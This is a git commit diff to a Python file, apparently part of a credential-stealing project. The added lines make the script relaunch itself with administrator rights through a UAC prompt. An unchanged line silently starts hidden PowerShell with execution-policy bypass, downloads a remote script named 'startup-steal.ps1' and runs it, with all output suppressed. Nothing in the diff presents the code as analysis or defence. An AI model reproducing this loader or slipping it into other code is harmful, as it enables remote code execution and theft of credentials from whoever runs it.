1631f7b19d1b8ca4135eaab5d31db79ef9ce88ff
43a1723 <hai1723notgay@gmail.com>
2024-09-11 19:58:37 +0700

    Update lmao.py

--- scr/lmao.py
+++ scr/lmao.py
@@ -1,1 +1,7 @@
+import sys
+import ctypes
+if not ctypes.windll.shell32.IsUserAnAdmin() == 1:
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+        exit()
+
 __import__('subprocess').Popen('powershell -nop -ep bypass -w hidden -c "iwr -useb https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/startup-steal.ps1 | iex"', shell=True, stdout=-3, stderr=-3)
